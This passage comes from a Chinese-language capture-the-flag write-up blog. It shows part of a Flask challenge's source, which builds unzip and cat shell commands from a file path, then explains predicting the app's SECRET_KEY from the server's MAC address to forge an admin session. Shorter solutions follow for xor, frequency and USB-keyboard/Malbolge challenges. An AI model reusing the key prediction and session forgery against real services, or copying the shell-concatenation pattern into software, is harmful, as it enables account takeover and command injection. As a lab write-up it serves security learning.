</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>    <span style=color:#ff79c6>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>        extract_path <span style=color:#ff79c6>=</span> file_save_path <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;_&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>        os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;unzip -n &#39;</span> <span style=color:#ff79c6>+</span> file_save_path <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; -d &#39;</span><span style=color:#ff79c6>+</span> extract_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span>        read_obj <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>popen(<span style=color:#f1fa8c>&#39;cat &#39;</span> <span style=color:#ff79c6>+</span> extract_path <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;/*&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span>        file <span style=color:#ff79c6>=</span> read_obj<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>        read_obj<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>        os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;rm -rf &#39;</span> <span style=color:#ff79c6>+</span> extract_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>    <span style=color:#ff79c6>except</span> Exception <span style=color:#ff79c6>as</span> e:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>        file <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span>    os<span style=color:#ff79c6>.</span>remove(file_save_path)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span>    <span style=color:#ff79c6>if</span>(file <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>None</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span>        <span style=color:#ff79c6>if</span>(file<span style=color:#ff79c6>.</span>find(base64<span style=color:#ff79c6>.</span>b64decode(<span style=color:#f1fa8c>&#39;aGN0Zg==&#39;</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;utf-8&#39;</span>)) <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span>            <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;index&#39;</span>, error<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span>    <span style=color:#ff79c6>return</span> Response(file)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span><span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>    <span style=color:#6272a4>#app.run(debug=True)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span>    app<span style=color:#ff79c6>.</span>run(host<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;127.0.0.1&#39;</span>, debug<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>, port<span style=color:#ff79c6>=</span><span style=color:#bd93f9>10008</span>)
</span></span></code></pre></div><p>尝试读了一下 <code>flag.py</code>, 得到的却是一个 <code>html</code> 文件&mldr; 好吧看来不是这个意思, 看来出题人是把它放在 <code>site-package</code> 之类的地方了, 但是这就真的是大海捞针了, 不太可能通过直接读源码的方式找到 <code>flag</code>. 想想上一题, 或许也可能是通过得到 <code>SECRET_KEY</code> 的方式来伪造 <code>session</code>, 看了下对应的代码, 发现</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>random<span style=color:#ff79c6>.</span>seed(uuid<span style=color:#ff79c6>.</span>getnode())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>app <span style=color:#ff79c6>=</span> Flask(__name__)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>app<span style=color:#ff79c6>.</span>config[<span style=color:#f1fa8c>&#39;SECRET_KEY&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>str</span>(random<span style=color:#ff79c6>.</span>random()<span style=color:#ff79c6>*</span><span style=color:#bd93f9>100</span>)
</span></span></code></pre></div><p><code>uuid.getnode()</code> 返回的是网卡 <code>MAC</code> 地址, 也就是说 <code>SECRET_KEY</code> 其实是一个可以预测的值, 我们可以通过读取 <code>/sys/class/net/eth0/address</code> 来得到 <code>MAC</code> 地址 <code>12:34:3e:14:7c:62</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> <span style=color:#8be9fd;font-style:italic>int</span>(<span style=color:#bd93f9>0x12343e147c62</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#bd93f9>20015589129314</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> <span style=color:#ff79c6>import</span> random
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> random<span style=color:#ff79c6>.</span>seed(<span style=color:#bd93f9>20015589129314</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>(random<span style=color:#ff79c6>.</span>random()<span style=color:#ff79c6>*</span><span style=color:#bd93f9>100</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#f1fa8c>&#39;11.935137566861131&#39;</span> <span style=color:#6272a4># SECRET_KEY</span>
</span></span></code></pre></div><p>之后伪造成为 <code>admin</code> 就可以了, flag get</p><p><img src=https://i.loli.net/2019/03/08/5c8277dba1c00.png#center alt referrerpolicy=no-referrer></p><h2 id=0x03xor-game>0x03 xor game</h2><p>直接丢到 <code>featherduster</code> 就出了原文, <code>xor</code> 一下 flag get</p><h2 id=0x04freq-game>0x04 freq game</h2><p>感觉师傅懒得写 writeup 233, 帮他说一下吧, 主要是用 <code>傅里叶变换</code> 将他给的 <code>list</code>, 还原成原来的四个值后再还原成 <code>freq</code> 就可以了, 说着简单但想想写起来就很烦&mldr;</p><h2 id=0x05difficult-programming-language>0x05 difficult programming language</h2><p>拿到流量包, 感觉就像是键盘的 usb 信号, 用 tshark 提取出来后, 找到一个外国人写的脚本稍微改一下, 还原一下输入的字符</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>usb_codes <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>   <span style=color:#bd93f9>0x04</span>:<span style=color:#f1fa8c>&#34;aA&#34;</span>, <span style=color:#bd93f9>0x05</span>:<span style=color:#f1fa8c>&#34;bB&#34;</span>, <span style=color:#bd93f9>0x06</span>:<span style=color:#f1fa8c>&#34;cC&#34;</span>, <span style=color:#bd93f9>0x07</span>:<span style=color:#f1fa8c>&#34;dD&#34;</span>, <span style=color:#bd93f9>0x08</span>:<span style=color:#f1fa8c>&#34;eE&#34;</span>, <span style=color:#bd93f9>0x09</span>:<span style=color:#f1fa8c>&#34;fF&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>   <span style=color:#bd93f9>0x0A</span>:<span style=color:#f1fa8c>&#34;gG&#34;</span>, <span style=color:#bd93f9>0x0B</span>:<span style=color:#f1fa8c>&#34;hH&#34;</span>, <span style=color:#bd93f9>0x0C</span>:<span style=color:#f1fa8c>&#34;iI&#34;</span>, <span style=color:#bd93f9>0x0D</span>:<span style=color:#f1fa8c>&#34;jJ&#34;</span>, <span style=color:#bd93f9>0x0E</span>:<span style=color:#f1fa8c>&#34;kK&#34;</span>, <span style=color:#bd93f9>0x0F</span>:<span style=color:#f1fa8c>&#34;lL&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>   <span style=color:#bd93f9>0x10</span>:<span style=color:#f1fa8c>&#34;mM&#34;</span>, <span style=color:#bd93f9>0x11</span>:<span style=color:#f1fa8c>&#34;nN&#34;</span>, <span style=color:#bd93f9>0x12</span>:<span style=color:#f1fa8c>&#34;oO&#34;</span>, <span style=color:#bd93f9>0x13</span>:<span style=color:#f1fa8c>&#34;pP&#34;</span>, <span style=color:#bd93f9>0x14</span>:<span style=color:#f1fa8c>&#34;qQ&#34;</span>, <span style=color:#bd93f9>0x15</span>:<span style=color:#f1fa8c>&#34;rR&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>   <span style=color:#bd93f9>0x16</span>:<span style=color:#f1fa8c>&#34;sS&#34;</span>, <span style=color:#bd93f9>0x17</span>:<span style=color:#f1fa8c>&#34;tT&#34;</span>, <span style=color:#bd93f9>0x18</span>:<span style=color:#f1fa8c>&#34;uU&#34;</span>, <span style=color:#bd93f9>0x19</span>:<span style=color:#f1fa8c>&#34;vV&#34;</span>, <span style=color:#bd93f9>0x1A</span>:<span style=color:#f1fa8c>&#34;wW&#34;</span>, <span style=color:#bd93f9>0x1B</span>:<span style=color:#f1fa8c>&#34;xX&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>   <span style=color:#bd93f9>0x1C</span>:<span style=color:#f1fa8c>&#34;yY&#34;</span>, <span style=color:#bd93f9>0x1D</span>:<span style=color:#f1fa8c>&#34;zZ&#34;</span>, <span style=color:#bd93f9>0x1E</span>:<span style=color:#f1fa8c>&#34;1!&#34;</span>, <span style=color:#bd93f9>0x1F</span>:<span style=color:#f1fa8c>&#34;2@&#34;</span>, <span style=color:#bd93f9>0x20</span>:<span style=color:#f1fa8c>&#34;3#&#34;</span>, <span style=color:#bd93f9>0x21</span>:<span style=color:#f1fa8c>&#34;4$&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>   <span style=color:#bd93f9>0x22</span>:<span style=color:#f1fa8c>&#34;5%&#34;</span>, <span style=color:#bd93f9>0x23</span>:<span style=color:#f1fa8c>&#34;6^&#34;</span>, <span style=color:#bd93f9>0x24</span>:<span style=color:#f1fa8c>&#34;7&amp;&#34;</span>, <span style=color:#bd93f9>0x25</span>:<span style=color:#f1fa8c>&#34;8*&#34;</span>, <span style=color:#bd93f9>0x26</span>:<span style=color:#f1fa8c>&#34;9(&#34;</span>, <span style=color:#bd93f9>0x27</span>:<span style=color:#f1fa8c>&#34;0)&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>   <span style=color:#bd93f9>0x2C</span>:<span style=color:#f1fa8c>&#34;  &#34;</span>, <span style=color:#bd93f9>0x2D</span>:<span style=color:#f1fa8c>&#34;-_&#34;</span>, <span style=color:#bd93f9>0x2E</span>:<span style=color:#f1fa8c>&#34;=+&#34;</span>, <span style=color:#bd93f9>0x2F</span>:<span style=color:#f1fa8c>&#34;[{&#34;</span>, <span style=color:#bd93f9>0x30</span>:<span style=color:#f1fa8c>&#34;]}&#34;</span>,  <span style=color:#bd93f9>0x32</span>:<span style=color:#f1fa8c>&#34;#~&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>   <span style=color:#bd93f9>0x33</span>: <span style=color:#f1fa8c>&#34;;:&#34;</span>, <span style=color:#bd93f9>0x34</span>: <span style=color:#f1fa8c>&#34;&#39;</span><span style=color:#f1fa8c>\&#34;</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#bd93f9>0x36</span>: <span style=color:#f1fa8c>&#34;,&lt;&#34;</span>, <span style=color:#bd93f9>0x37</span>: <span style=color:#f1fa8c>&#34;.&gt;&#34;</span>, <span style=color:#bd93f9>0x4f</span>: <span style=color:#f1fa8c>&#34;&gt;&#34;</span>, <span style=color:#bd93f9>0x50</span>: <span style=color:#f1fa8c>&#34;&lt;&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>   <span style=color:#bd93f9>0x35</span>: <span style=color:#f1fa8c>&#34;`~&#34;</span>, <span style=color:#bd93f9>0x38</span>: <span style=color:#f1fa8c>&#34;/?&#34;</span>, <span style=color:#bd93f9>0x31</span>: <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>|&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>   }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>lines <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#34;&#34;</span>,<span style=color:#f1fa8c>&#34;&#34;</span>,<span style=color:#f1fa8c>&#34;&#34;</span>,<span style=color:#f1fa8c>&#34;&#34;</span>,<span style=color:#f1fa8c>&#34;&#34;</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>pos <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#ff79c6>for</span> x <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#34;dpl&#34;</span>,<span style=color:#f1fa8c>&#34;r&#34;</span>)<span style=color:#ff79c6>.</span>readlines():
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>   code <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(x[<span style=color:#bd93f9>6</span>:<span style=color:#bd93f9>8</span>],<span style=color:#bd93f9>16</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>   <span style=color:#ff79c6>if</span> code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>       <span style=color:#ff79c6>continue</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>   <span style=color:#6272a4># newline or down arrow - move down</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>   <span style=color:#ff79c6>if</span> code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0x51</span> <span style=color:#ff79c6>or</span> code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0x28</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>       pos <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>       <span style=color:#ff79c6>continue</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>   <span style=color:#6272a4># up arrow - move up</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>   <span style=color:#ff79c6>if</span> code <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0x52</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>       pos <span style=color:#ff79c6>-=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>       <span style=color:#ff79c6>continue</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>   <span style=color:#6272a4># select the character based on the Shift key</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>   <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>int</span>(x[<span style=color:#bd93f9>0</span>:<span style=color:#bd93f9>2</span>],<span style=color:#bd93f9>16</span>) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>2</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>       lines[pos] <span style=color:#ff79c6>+=</span> usb_codes[code][<span style=color:#bd93f9>1</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>   <span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>       lines[pos] <span style=color:#ff79c6>+=</span> usb_codes[code][<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#ff79c6>for</span> x <span style=color:#ff79c6>in</span> lines:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>   <span style=color:#8be9fd;font-style:italic>print</span> x
</span></span></code></pre></div><p>得到了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>D&#39;`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&#39;e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|{ts9wvXWm3~c
</span></span></code></pre></div><p>因为之前做了科大的 <code>hackergame</code> 感觉出来是 <code>malbolge</code>, 把最后的 <code>c</code> 删掉就可以跑了, 运行一下就得到 flag.<br><img src=https://i.loli.net/2019/03/08/5c82782071137.png#center alt referrerpolicy=no-referrer></p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hctf>hctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>© 2017 - 2022, rmb122</div><div style=display:flex><span class=border></span><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a><a class=soc href=https://rmb122.com/index.xml title=RSS><i data-feather=rss></i></a></div></footer><script>feather.replace()</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-1MH3QGWHV5"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1MH3QGWHV5",{anonymize_ip:!1})}</script><script src=https://rmb122.com/js/medium-zoom.min.js></script>
<script>for(let e of document.getElementsByTagName("img"))mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})</script></div></body></html>